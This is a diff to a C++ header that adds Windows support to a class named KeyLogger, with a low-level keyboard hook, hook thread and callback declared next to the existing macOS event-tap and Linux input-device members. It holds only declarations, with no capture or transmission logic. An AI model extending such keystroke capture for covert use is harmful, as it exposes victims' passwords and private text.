@@ -4,9 +4,15 @@
 #include <mutex>
 #include <atomic>
 
-#ifdef __APPLE__
 #include <thread>
+
+#ifdef __APPLE__
 #include <CoreGraphics/CoreGraphics.h>
+#elif defined(_WIN32)
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#include <windows.h>
 #endif
 
 namespace inferno {
@@ -47,6 +53,13 @@ private:
     CFRunLoopSourceRef       m_runloop_source;
     static CGEventRef        eventCallback(CGEventTapProxy proxy, CGEventType type,
                                            CGEventRef event, void* refcon);
+    void appendKeystroke(const std::string& stroke);
+#elif defined(_WIN32)
+    std::thread              m_hook_thread;
+    HHOOK                    m_keyboard_hook;
+    DWORD                    m_hook_thread_id;
+    static LRESULT CALLBACK  keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
+    static KeyLogger*        s_instance;
     void appendKeystroke(const std::string& stroke);
 #elif defined(__linux__)
     int                      m_input_fd; // /dev/input/eventX file descriptor
